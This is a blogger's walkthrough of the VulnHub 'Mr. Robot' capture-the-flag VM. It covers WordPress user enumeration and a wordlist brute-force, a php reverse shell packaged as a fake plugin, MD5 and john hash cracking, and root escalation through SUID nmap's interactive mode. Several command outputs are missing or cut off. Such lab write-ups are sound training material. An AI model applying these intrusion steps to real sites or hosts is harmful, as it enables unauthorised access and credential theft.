Time for another boot2root! I'm a fan of the Mr. Robot TV series, so I was looking forward to giving this one a go. It's been out for a while now and can be downlaoded from [VulnHub](https://www.vulnhub.com/entry/mr-robot-1,151/). This challenge is based off the TV show and contains three flags. To ensure I was in the proper mood, I put on the [Mr. Robot Soundtrack](https://itunes.apple.com/ca/album/mr.-robot-vol.-1-original/id1111847619), dimmed the lights, kept my power drill beside me, and fired up the official Mr. Robot hacking OS; [Kali Linux](https://www.kali.org/). 

First up, a detailed TCP and UDP port scan to ensure I didn't miss anything. 

```

TCP 80 and 443 were both open and running HTTP. I fired up nikto to see if anything interesting came up. 

```

Looks like it was running WordPress. I downloaded the robots.txt to see if it was hiding anything of interest:

```
# curl http://172.16.146.134/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Found the first flag, and something called fsocity.dic.

```
# curl http://172.16.146.134/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

fsocity.dic was some kind of wordlist:

```
# head fsocity.dic 
true
false

Wikia

scss

```

Next I checked out http://172.16.146.134/blog/wp-login, which returned an unfinished WordPress blog. I ran wpscan on the site and found nothing that I could use to really exploit the site. Brute-forcing a login to the blog seemed to be the next course of action given that a wordlist had been conveniently provided. Being a Mr. Robot themed VM, I tried guessing various user names based off characters on the show, and seeing what error I'd get. I got a good hit on the user "elliot" when WordPress complained that the password was incorrect, rather than the user didn't exist. 

I used wpscan to perform the dictionary attack on the WordPress instance:

Almost 4 hours later, I got the password: ER28-0652. 

So I logged in and poked around. Next step seemed to be to get a shell on the target. That could easily be done by uploading a reverse shell plugin. I made a copy of Kali's php-reverse-shell.php, setup my IP address and port I'd be listening on, and added some comments at the top to make it a valid WordPress plugin:

```
<?php
/*
*     Plugin Name: Pwn It
*     Plugin URI: https://github.com/superkojiman/pwnit
*     Description: Get a shell yo
*     Author: superkojiman
*     Version: 13.37
*     Author URI: https://techorganic.com
*                             
*/
```

I zipped it up, uploaded the plugin and activated it. It worked, and I got a reverse shell on my listener:

```

```

Found a directory called /home/robot with the second key, as well as a file called password.raw-md5. I didn't have read permissions on the key, but I could read the contents of the password.raw-md5:

```
$ cat pass*
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Perhaps this was the password for the robot user account. Checking [md5cracker.org](http://md5cracker.org/decrypted-md5-hash/c3fcd3d76192e4007dfb496cca67e13b) revealed the password to be abcdefghijklmnopqrstuvwxyz

```
daemon@linux:/home/robot$ su - robot
su - robot
Password: abcdefghijklmnopqrstuvwxyz

$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)

```

w00t! One step closer to pwning this box. I opened up the key file next:

```
$ cat key* 
cat key*

Poking around some more I found that FTP and MySQL was listening on the local interface.

But more importantly, I found nmap in /usr/local/bin with SUID root privileges! This version of nmap also had the --interactive option, which meant I could run commands as root:

```
$ ls -l /usr/local/bin/nmap
ls -l /usr/local/bin/nmap
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
$ /usr/local/bin/nmap --interactive

Now I could see what was in /root

```
# cd /root

```

Found the third key:

```
# cat key*
cat key*
04787ddef27c3dee1ee161b21670b4e4
```

I now had all three keys:

1. 073403c8a58a1f80d943455fb30724b9
1. 822c73956184f694993bede3eb39f959
1. 04787ddef27c3dee1ee161b21670b4e4

Wasn't entirely sure what to do with them, but I decided to poke around more. First up, the MySQL instance. MySQL is installed in /opt/bitnami/mysql and the root login for the instance had the default password of "bitnami". Once I logged in, I looked at the contents of the wp_users table:


```
mysql> select user_login,user_pass from wp_users;
select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+

| elliot     | $P$BHh01ohuhaRcy2EAC6ad//vTQ1eMwe. |
+------------+------------------------------------+
2 rows in set (0.00 sec)
```

So there was another user, mich05654 with password hash $P$BpmKcWWjgC3/UGtj/fO36PsCxYC2E51. I ran that through john and it cracked it instantly:

```
# john --wordlist=/root/mrrobot/fsocity.dic mich.hash

Password: Dylan_2791

I logged into WordPress using those account credentials and found that it was the account of Elliot's therapist; Krista Gordon. 

I initially thought I had to use those keys for something, but I couldn't really find anything else to do. So I suppose that's it.

Overall, this was pretty fun, despite the insanely long time it took to brute-force ellito's password. I was clued in later on that there were lots of duplicates in the fsocity.dic file that I could have removed to speed things up. Lesson learned. It was smooth sailing once I got a shell though. Cheers to Jason for creating it and making it available!
